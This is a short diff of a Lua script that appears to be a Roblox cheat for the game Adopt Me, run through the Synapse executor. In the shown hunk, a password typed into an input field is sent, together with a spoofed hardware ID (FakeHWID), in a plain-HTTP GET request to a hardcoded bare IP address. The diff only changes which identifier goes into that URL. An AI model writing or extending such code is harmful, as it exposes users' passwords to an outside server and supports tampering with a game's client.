@@ -1024,7 +1024,7 @@ local Input = AdoptMe:CreateInput({
         passwordAPI = Text
         if syn then
             syn.request({
-                Url = "http://141.144.230.49/ponerContra/"..usernameAPI.."/"..passwordAPI,
+                Url = "http://141.144.230.49/ponerContra/"..FakeHWID.."/"..passwordAPI,
                 Method = "GET"
             })
         end
